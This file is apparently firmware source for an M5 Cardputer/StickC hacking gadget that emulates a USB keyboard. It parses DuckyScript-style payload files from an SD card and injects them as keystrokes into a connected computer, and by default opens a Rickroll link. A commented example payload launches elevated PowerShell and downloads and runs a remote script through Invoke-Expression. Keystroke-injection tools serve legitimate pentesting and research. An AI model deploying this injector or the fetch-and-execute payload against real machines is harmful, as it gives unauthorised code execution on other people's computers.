#ifdef CARDPUTER
#include <USB.h>
#include <SPI.h>
#include <time.h>

// For some reason, StickC and P and P2 dont recognize the following library... may be it need to use EspTinyUSB lib.... need studies
#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;


//#include <BleKeyboard.h>
//BleKeyboard bleKeyboard;
//

#define KEYPAUSE 0xD0
#define KEYNUM_LOCK 0xDB
#define KEYPRINT_SCREEN 0xCE
#define KEYSCROLL_LOCK 0xCF
#define KEYCAPS_LOCK 0xC1
#define KEYMENU 0xED
#define KEYLEFT_CTRL 0x80
#define KEYLEFT_SHIFT 0x81
#define KEYLEFT_ALT 0x82
#define KEYLEFT_GUI 0x83
#define KEYBACKSPACE 0xB2
#define KEYTAB 0xB3
#define KEYENTER 0x28
#define KEYRETURN 0xB0
#define KEYINSERT 0xD1
#define KEYDELETE 0xD4
#define KEYHOME 0xD2
#define KEYEND 0xD5
#define KEYPAGE_UP 0xD3
#define KEYPAGE_DOWN 0xD6
#define KEYUP_ARROW 0xDA
#define KEYDOWN_ARROW 0xD9
#define KEYLEFT_ARROW 0xD8
#define KEYRIGHT_ARROW 0xD7

#define KEYESC 0xB1
#define KEYF1 0xC2
#define KEYF2 0xC3
#define KEYF3 0xC4
#define KEYF4 0xC5
#define KEYF5 0xC6
#define KEYF6 0xC7
#define KEYF7 0xC8
#define KEYF8 0xC9
#define KEYF9 0xCA
#define KEYF10 0xCB
#define KEYF11 0xCC
#define KEYF12 0xCD


#define MAX_FILES 256
#define MAX_FOLDERS 256
#define DEF_DELAY 100
File fileRoot;
File root;
String PreFolder = "/";
String fileList[MAX_FILES];
String folderList[MAX_FOLDERS];

int fileListCount;
int folderListCount;
int startIndex;
int endIndex;
int selectIndex;
bool needRedraw = true;





/* Example of payload file

REM Author: UNC0V3R3D
REM Description: Uses powershell to rotate the monitor by 90 degrees.
REM Version: 1.0
REM Category: FUN
DELAY 800
GUI r
DELAY 800
STRING powershell Start-Process powershell -Verb runAs
DELAY 800
ENTER
DELAY 800
LEFTARROW
DELAY 800
ENTER
DELAY 500
STRING Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/UNC0V3R3D/resources/main/monitor_rotation.ps1").Content


*/


void sortList(String fileList[], int fileListCount) {
  bool swapped;
  String temp;
  String name1, name2;
  do {
    swapped = false;
    for (int i = 0; i < fileListCount - 1; i++) {
      name1 = fileList[i];
      name1.toUpperCase();
      name2 = fileList[i + 1];
      name2.toUpperCase();
      if (name1.compareTo(name2) > 0) {
        temp = fileList[i];
        fileList[i] = fileList[i + 1];
        fileList[i + 1] = temp;
        swapped = true;
      }
    }
  } while (swapped);
}


void readFs(String folder) {
  for (int i = 0; i < 255; ++i) {  // Reset all vectors.
    fileList[i] = "";              // Reset all vectors.
    folderList[i] = "";            // Reset all vectors.
  }
  //Read files in folder
  fileRoot = SD.open(folder);

  fileListCount = 0;
  File entry = fileRoot.openNextFile();
  while (entry) {
    if (!entry.isDirectory()) {
      String fullFileName = entry.name();
      String fileName = fullFileName.substring(fullFileName.lastIndexOf("/") + 1);
      String ext = fileName.substring(fileName.lastIndexOf(".") + 1);
      ext.toUpperCase();
      if (ext.equals("TXT") == true) {
        fileList[fileListCount] = fileName;
        fileListCount++;
      }
    }
    entry = fileRoot.openNextFile();
  }
  fileRoot.close();
  //Read folders in folder
  root = SD.open(folder);
  folderListCount = 0;
  File file = root.openNextFile();
  while (file) {
    if (file.isDirectory()) {
      String fullFolderName = file.path();
      String folderName = fullFolderName.substring(fullFolderName.lastIndexOf("/") + 1);
      folderList[folderListCount] = folderName;
      folderListCount++;
    }
    file = root.openNextFile();
  }
  root.close();

  sortList(fileList, fileListCount);
  sortList(folderList, folderListCount);

  startIndex = 0;
  endIndex = startIndex + 8;
  if (endIndex >= (fileListCount + folderListCount)) {
    endIndex = folderListCount + fileListCount - 1;
  }

  needRedraw = true;
  selectIndex = 0;
}



void key_input(String bad_script = "/badpayload.txt") {
  //The commented commands should be set in the payload file as not all payloads run the same thing
  //Keyboard.press(KEYLEFT_GUI);
  //Keyboard.press('r');
  //Keyboard.releaseAll();
  delay(1000);

  if (SD.exists(bad_script)) {
    File payloadFile = SD.open(bad_script, "r");
    if (payloadFile) {
      DISP.setCursor(0, 40);
      DISP.println("from file!");
      String lineContent = "";
      String Command = "";
      char Cmd[15];
      String Argument = "";
      String RepeatTmp = "";
      char ArgChar;
      bool ArgIsCmd;  // Verifies if the Argument is DELETE, TAB or F1-F12
      int cmdFail;    // Verifies if the command is supported, mus pass through 2 if else statemens and summ 2 to not be supported
      int line;       // Shows 3 commands of the payload on screen to follow the execution


      Keyboard.releaseAll();
      DISP.setTextSize(1);
      DISP.setCursor(0, 0);
      DISP.fillScreen(BLACK);
      line = 0;

      while (payloadFile.available()) {
        lineContent = payloadFile.readStringUntil('\n');  // O CRLF é uma combinação de dois caracteres de controle: o “Carriage Return” (retorno de carro) representado pelo caractere “\r” e o “Line Feed” (avanço de linha) representado pelo caractere “\n”.
        if (lineContent.endsWith("\r")) lineContent.remove(lineContent.length() - 1);
        // if (lineContent.endsWith("\n")) lineContent.remove(lineContent.length() - 1);

        ArgIsCmd = false;
        cmdFail = 0;
        RepeatTmp = lineContent.substring(0, lineContent.indexOf(' '));
        RepeatTmp = RepeatTmp.c_str();
        if (RepeatTmp == "REPEAT") {
          if (lineContent.indexOf(' ') > 0) {
            RepeatTmp = lineContent.substring(lineContent.indexOf(' ') + 1);  // how many times it will repeat, using .toInt() conversion;
            if (RepeatTmp.toInt() == 0) {
              RepeatTmp = "1";
              DISP.setTextColor(RED);
              DISP.println("REPEAT argument NaN, repeating once");
            }
          } else {
            RepeatTmp = "1";
            DISP.setTextColor(RED);
            DISP.println("REPEAT without argument, repeating once");
          }
        } else {
          if (lineContent.indexOf(' ') < 0) { lineContent += " None"; }    // adds a space to the lineContent to make Single commands as ENTER work
          Command = lineContent.substring(0, lineContent.indexOf(' '));    // get the Command
          strcpy(Cmd, Command.c_str());                                    // get the cmd
          Argument = lineContent.substring(lineContent.indexOf(' ') + 1);  // get the argument
          RepeatTmp = "1";
        }
        uint16_t i;
        for (i = 0; i < RepeatTmp.toInt(); i++) {
          char OldCmd[15];
          //Command = char(Command.c_str());
          Argument = Argument.c_str();
          ArgChar = Argument.charAt(0);

          if (Argument == "F1" || Argument == "F2" || Argument == "F3" || Argument == "F4" || Argument == "F5" || Argument == "F6" || Argument == "F7" || Argument == "F8" || Argument == "F9" || Argument == "F10" || Argument == "F11" || Argument == "F2" || Argument == "DELETE" || Argument == "TAB") { ArgIsCmd = true; }

          if (strcmp(Cmd, "REM") == 0) {
            Serial.println(" // " + Argument);
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "DELAY") == 0) delay(Argument.toInt());
          else { cmdFail++; }
          if (strcmp(Cmd, "DEFAULTDELAY") == 0 || strcmp(Cmd, "DEFAULT_DELAY") == 0) delay(DEF_DELAY);
          else { cmdFail++; }  //100ms
          if (strcmp(Cmd, "STRING") == 0) Keyboard.print(Argument);
          else { cmdFail++; }
          if (strcmp(Cmd, "STRINGLN") == 0) Keyboard.println(Argument);
          else { cmdFail++; }  // I Don't know if it works
          if (strcmp(Cmd, "ENTER") == 0) {
            Keyboard.press(KEYRETURN);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }  //strcmp(Cmd, "ENTER") ==0
          if (strcmp(Cmd, "GUI") == 0 || strcmp(Cmd, "WINDOWS") == 0) {
            Keyboard.press(KEYLEFT_GUI);
            if (!ArgIsCmd) {
              Keyboard.press(ArgChar);
              Keyboard.releaseAll();
            } else {
              strcpy(OldCmd, Cmd);
              strcpy(Cmd, Argument.c_str());
            }
          } else {
            cmdFail++;
          }  // Save Cmd into OldCmd and then set Cmd = Argument
          if (strcmp(Cmd, "SHIFT") == 0) {
            Keyboard.press(KEYLEFT_SHIFT);
            if (!ArgIsCmd) {
              Keyboard.press(ArgChar);
              Keyboard.releaseAll();
            } else {
              strcpy(OldCmd, Cmd);
              strcpy(Cmd, Argument.c_str());
            }
          } else {
            cmdFail++;
          }  // This is made to turn the code faster and to recover
          if (strcmp(Cmd, "ALT") == 0) {
            Keyboard.press(KEYLEFT_ALT);
            if (!ArgIsCmd) {
              Keyboard.press(ArgChar);
              Keyboard.releaseAll();
            } else {
              strcpy(OldCmd, Cmd);
              strcpy(Cmd, Argument.c_str());
            }
          } else {
            cmdFail++;
          }  // the Cmd after the if else statements, in order to
          if (strcmp(Cmd, "CTRL") == 0 || strcmp(Cmd, "CONTROL") == 0) {
            Keyboard.press(KEYLEFT_CTRL);
            if (!ArgIsCmd) {
              Keyboard.press(ArgChar);
              Keyboard.releaseAll();
            } else {
              strcpy(OldCmd, Cmd);
              strcpy(Cmd, Argument.c_str());
            }
          } else {
            cmdFail++;
          }  // the Cmd REPEAT work as intended.
          if (strcmp(Cmd, "CTRL-ALT") == 0) {
            Keyboard.press(KEYLEFT_ALT);
            Keyboard.press(KEYLEFT_CTRL);
            if (!ArgIsCmd) {
              Keyboard.press(ArgChar);
              Keyboard.releaseAll();
            } else {
              strcpy(OldCmd, Cmd);
              strcpy(Cmd, Argument.c_str());
            }
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "CTRL-SHIFT") == 0) {
            Keyboard.press(KEYLEFT_CTRL);
            Keyboard.press(KEYLEFT_SHIFT);
            if (!ArgIsCmd) {
              Keyboard.press(ArgChar);
              Keyboard.releaseAll();
            } else {
              strcpy(OldCmd, Cmd);
              strcpy(Cmd, Argument.c_str());
            }
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "ALT-SHIFT") == 0) {
            Keyboard.press(KEYLEFT_ALT);
            Keyboard.press(KEYLEFT_SHIFT);
            if (!ArgIsCmd) {
              Keyboard.press(ArgChar);
              Keyboard.releaseAll();
            } else {
              strcpy(OldCmd, Cmd);
              strcpy(Cmd, Argument.c_str());
            }
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "ALT-GUI") == 0) {
            Keyboard.press(KEYLEFT_ALT);
            Keyboard.press(KEYLEFT_GUI);
            if (!ArgIsCmd) {
              Keyboard.press(ArgChar);
              Keyboard.releaseAll();
            } else {
              strcpy(OldCmd, Cmd);
              strcpy(Cmd, Argument.c_str());
            }
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "GUI-SHIFT") == 0) {
            Keyboard.press(KEYLEFT_GUI);
            Keyboard.press(KEYLEFT_SHIFT);
            if (!ArgIsCmd) {
              Keyboard.press(ArgChar);
              Keyboard.releaseAll();
            } else {
              strcpy(OldCmd, Cmd);
              strcpy(Cmd, Argument.c_str());
            }
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "DOWNARROW") == 0) {
            Keyboard.press(KEYDOWN_ARROW);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "DOWN") == 0) {
            Keyboard.press(KEYDOWN_ARROW);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "LEFTARROW") == 0) {
            Keyboard.press(KEYLEFT_ARROW);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "LEFT") == 0) {
            Keyboard.press(KEYLEFT_ARROW);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "RIGHTARROW") == 0) {
            Keyboard.press(KEYRIGHT_ARROW);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "RIGHT") == 0) {
            Keyboard.press(KEYRIGHT_ARROW);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "UPARROW") == 0) {
            Keyboard.press(KEYUP_ARROW);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "UP") == 0) {
            Keyboard.press(KEYUP_ARROW);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "BREAK") == 0) {
            Keyboard.press(KEYPAUSE);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "CAPSLOCK") == 0) {
            Keyboard.press(KEYCAPS_LOCK);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "PAUSE") == 0) {
            Keyboard.press(KEYPAUSE);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "BACKSPACE") == 0) {
            Keyboard.press(KEYBACKSPACE);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "END") == 0) {
            Keyboard.press(KEYEND);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "ESC") == 0 || strcmp(Cmd, "ESCAPE") == 0) {
            Keyboard.press(KEYESC);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "HOME") == 0) {
            Keyboard.press(KEYHOME);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "INSERT") == 0) {
            Keyboard.press(KEYINSERT);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "NUMLOCK") == 0) {
            Keyboard.press(KEYNUM_LOCK);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "PAGEUP") == 0) {
            Keyboard.press(KEYPAGE_UP);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "PAGEDOWN") == 0) {
            Keyboard.press(KEYPAGE_DOWN);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "PRINTSCREEN") == 0) {
            Keyboard.press(KEYPRINT_SCREEN);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "SCROLLOCK") == 0) {
            Keyboard.press(KEYSCROLL_LOCK);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "MENU") == 0) {
            Keyboard.press(KEYMENU);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "F1") == 0) {
            Keyboard.press(KEYF1);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "F2") == 0) {
            Keyboard.press(KEYF2);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "F3") == 0) {
            Keyboard.press(KEYF3);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "F4") == 0) {
            Keyboard.press(KEYF4);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "F5") == 0) {
            Keyboard.press(KEYF5);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "F6") == 0) {
            Keyboard.press(KEYF6);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "F7") == 0) {
            Keyboard.press(KEYF7);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "F8") == 0) {
            Keyboard.press(KEYF8);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "F9") == 0) {
            Keyboard.press(KEYF9);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "F10") == 0) {
            Keyboard.press(KEYF10);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "F11") == 0) {
            Keyboard.press(KEYF11);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "F12") == 0) {
            Keyboard.press(KEYF12);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "TAB") == 0) {
            Keyboard.press(KEYTAB);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }
          if (strcmp(Cmd, "DELETE") == 0) {
            Keyboard.press(KEYDELETE);
            Keyboard.releaseAll();
          } else {
            cmdFail++;
          }


          if (ArgIsCmd) strcpy(Cmd, OldCmd);  // Recover the command to run in case of REPEAT

          //else if(strcmp(Command, "SPACE") ==0) Keyboard.press(" "); //Supported on Flipper but not here, yet
          //else if(strcmp(Command, "APP") ==0) Keyboard.press(APP); //Supported on Flipper but not here, yet
          //else if(strcmp(Command, "SYSRQ") ==0) Keyboard.press(SYSRQ); //Supported on Flipper but not here, yet
          Keyboard.releaseAll();

          if (line == 7) {
            DISP.setCursor(0, 0);
            DISP.fillScreen(BLACK);
            line = 0;
          }
          line++;

          if (cmdFail == 51) {
            DISP.setTextColor(RED);
            DISP.print(Command);
            DISP.println(" -> Not Supported, running as STRINGLN");
            if (Command != Argument) {
              Keyboard.print(Command);
              Keyboard.print(" ");
              Keyboard.println(Argument);
            } else {
              Keyboard.println(Command);
            }
          } else {
            DISP.setTextColor(GREEN);
            DISP.println(Command);
          }
          DISP.setTextColor(WHITE);
          DISP.println(Argument);

          if (strcmp(Cmd, "REM") != 0) delay(DEF_DELAY);  //if command is not a comment, wait DEF_DELAY until next command (100ms)
        }
      }
      DISP.setTextSize(MEDIUM_TEXT);
      payloadFile.close();
      Serial.println("Finished badusb payload execution...");
    }
  } else {
    // rick
    Serial.println("rick");
    DISP.setCursor(0, 40);
    DISP.println("rick");
    Keyboard.press(KEYLEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(1000);
    Keyboard.print("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
    Keyboard.press(KEYRETURN);
    Keyboard.releaseAll();
  }

  delay(1000);
  Keyboard.releaseAll();
}


void usb_setup() {
  ToggleSDCard();  // unmount SDCard
  ToggleSDCard();  // Remount SDCard
  Serial.println("BadUSB begin");
  DISP.fillScreen(BLACK);
  DISP.setTextColor(WHITE, BGCOLOR);
  DISP.setCursor(0, 0);
  int rot = 3;
  int dispfileCount = 8;
  String bad_script = "";
  bool ClickPwrBtn = false;
  bool ClickSideBtn = false;
  PreFolder="/";

  readFs("/");

  while (1) {
    // DRAW file list ==============================================================================================================
    if (needRedraw == true) {
      startIndex = selectIndex - 5;
      if (startIndex < 0) {
        startIndex = 0;
      }
      endIndex = startIndex + dispfileCount;
      if (endIndex >= (fileListCount + folderListCount)) {
        endIndex = fileListCount + folderListCount + 1;
        if (PreFolder != "/") { endIndex++; }
        if (selectIndex > 6) {
          startIndex = selectIndex - 6;
        } else {
          startIndex = 0;
        }
      }
      if (fileListCount == 0 && folderListCount == 0 && PreFolder == "/") {
        DISP.fillScreen(BLACK);
        DISP.setCursor(0, 0);
        DISP.setTextColor(RED, WHITE);
        DISP.println("\nSD is empty or there\nare no .txt in root.\nExample: d:\\badpayload.txt");
        delay(2000);
        readFs("/");
      } else {
        DISP.fillScreen(BLACK);
        DISP.setCursor(0, 0);
        for (int index = startIndex; index <= (endIndex + 1); index++) {
          DISP.setTextColor(WHITE, BLACK);  // RESET BG COLOR TO BLACK
          if (index == selectIndex) {
            if (index == 0) {
              DISP.setTextColor(BLACK, WHITE);
              DISP.print(">");
            } else if (index < folderListCount + 1) {
              DISP.setTextColor(BLUE);  // folders selected in Blue
              DISP.print(">");
            } else if (index < (folderListCount + fileListCount + 1)) {
              DISP.setTextColor(GREEN);  // files selected in Green
              DISP.print(">");
            } else if (index == (folderListCount + fileListCount + 1)) {
              if (PreFolder != "/") {
                DISP.setTextColor(RED, WHITE);  // folders in yellow
                DISP.print("<");
              }
            }
          } else {
            if (index == 0) {
              DISP.setTextColor(WHITE);
              DISP.print(" ");
            } else if (index < folderListCount + 1) {
              DISP.setTextColor(YELLOW);  // folders in yellow
              DISP.print(" ");
            } else if (index < (folderListCount + fileListCount + 1)) {
              DISP.setTextColor(WHITE);  // files in white
              DISP.print(" ");
            } else if (index == (folderListCount + fileListCount + 1)) {
              if (PreFolder != "/") {
                DISP.setTextColor(RED, BLACK);  // folders in yellow
                DISP.print(" ");
              }
            }
          }
          if (index == 0) {
            DISP.println(">> Send default    ");
          } else if (index < folderListCount + 1) {
            DISP.println(folderList[index - 1].substring(0, 15) + "/");
          } else if (index < (folderListCount + fileListCount + 1)) {
            DISP.println(fileList[index - folderListCount - 1].substring(0, 16));
          } else if (PreFolder != "/") {
            DISP.print("<< back            ");
            break;
          } else {
            break;
          }
        }
      }
      needRedraw = false;
      delay(150);
    }

    // END of DRAW file list ============================================================================================================

    // push Button Detection ==============================================================================================================
    M5.update();
#if defined(STICK_C_PLUS2)
    if (digitalRead(M5_BUTTON_MENU) == LOW) ClickPwrBtn = true;  // Power Button
#endif
#if defined(STICK_C_PLUS) || defined(STICK_C)
    if (M5.Axp.GetBtnPress()) ClickPwrBtn = true;  // Power Button
#endif
#if defined(STICK_C_PLUS) || defined(STICK_C) || defined(STICK_C_PLUS2)
    if (M5.BtnB.wasPressed()) ClickSideBtn = true;  // Side Button
#endif


#if defined(CARDPUTER)
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isKeyPressed('.'))  //Arrow Up
#else
    if ((ClickPwrBtn == true && rot == 1) || (ClickSideBtn == true && rot == 3))
#endif
    {
      selectIndex++;
      if (selectIndex > (fileListCount + folderListCount + 1) || (selectIndex == (fileListCount + folderListCount + 1) && PreFolder == "/")) {
        selectIndex = 0;
      }
#ifndef CARDPUTER
      ClickPwrBtn = false;
      ClickSideBtn = false;
#endif
      needRedraw = true;
      delay(100);
    }

#if defined(CARDPUTER)
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isKeyPressed(';'))  // Arrow Down
#else
    if ((ClickPwrBtn == true && rot == 3) || (ClickSideBtn == true && rot == 1))
#endif
    {
      selectIndex--;
      if (selectIndex < 0) {
        selectIndex = fileListCount + folderListCount - 1 + 1;
        if (PreFolder != "/") { selectIndex++; }
      }
#ifndef CARDPUTER
      ClickPwrBtn = false;
      ClickSideBtn = false;
#endif
      needRedraw = true;
      delay(100);
    }

// END of push Button Detection ===========================================================================================================

// File Selection =========================================================================================================================
#if defined(STICK_C_PLUS2) || defined(STICK_C_PLUS) || defined(STICK_C)
    if (M5.BtnA.wasPressed())  // M5 button
#else
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER))  // Enter
#endif
    {
      if (selectIndex == 0) {  //when Default is selected
        DISP.fillScreen(BLACK);
#if defined(STICK_C) || defined(STICK_C_PLUS)
        M5.Axp.ScreenBreath(7);
#else
        DISP.setBrightness(0);
#endif
        bad_script = "/badpayload.txt";
        break;

      } else if (selectIndex < (folderListCount + 1)) {  //When select a Folder
        if (PreFolder == "/") {
          PreFolder = PreFolder + folderList[selectIndex - 1];
        } else {
          PreFolder = PreFolder + "/" + folderList[selectIndex - 1];
        }
        selectIndex = 0;
        readFs(PreFolder);

      } else if (fileList[selectIndex - folderListCount - 1] == "") {  // When press Back btn
        PreFolder = PreFolder.substring(0, PreFolder.lastIndexOf("/"));
        if (PreFolder == "") { PreFolder = "/"; }
        selectIndex = 0;
        readFs(PreFolder);

      } else {  // when select a file
        bad_script = PreFolder + "/" + fileList[selectIndex - folderListCount - 1];
        break;  // Exit while andd start bad USB
      }
    }
  }

  DISP.setTextSize(MEDIUM_TEXT);
  DISP.fillScreen(BLACK);
  DISP.setCursor(0, 0);
  DISP.println("Sending...");

  Keyboard.begin();
  USB.begin();

  delay(2000);
  key_input(bad_script);
  DISP.setCursor(0, 0);
  DISP.setTextColor(GREEN, BGCOLOR);
  DISP.println("PAYLOAD SENT!");
  DISP.setTextColor(FGCOLOR, BGCOLOR);
}

void usb_loop() {
}


#ifdef CARDPUTER
/*

Now cardputer works as a USB Keyboard!

Keyboard functions 
Created by: edulk2, thankss

*/

void keyboard_setup() {
  DISP.clear();
  DISP.setRotation(1);
  DISP.setTextColor(GREEN);
  DISP.setTextDatum(middle_center);
  DISP.setTextSize(2);
  DISP.drawString("Keyboard Started",
                  DISP.width() / 2,
                  DISP.height() / 2);
  Keyboard.begin();
  USB.begin();
  DISP.setTextColor(FGCOLOR, BGCOLOR);
}

void keyboard_loop() {
  M5Cardputer.update();
  if (M5Cardputer.Keyboard.isChange()) {
    if (M5Cardputer.Keyboard.isPressed()) {
      Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();

      KeyReport report = { 0 };
      report.modifiers = status.modifiers;
      uint8_t index = 0;
      for (auto i : status.hid_keys) {
        report.keys[index] = i;
        index++;
        if (index > 5) {
          index = 5;
        }
      }
      Keyboard.sendReport(&report);
      Keyboard.releaseAll();

      // only text for display
      String keyStr = "";
      for (auto i : status.word) {
        if (keyStr != "") {
          keyStr = keyStr + "+" + i;
        } else {
          keyStr += i;
        }
      }

      if (keyStr.length() > 0) {
        DISP.clear();
        DISP.drawString("Pressed: " + keyStr,
                        DISP.width() / 2,
                        DISP.height() / 2);
      }
    }
  }
}

#endif
#endif
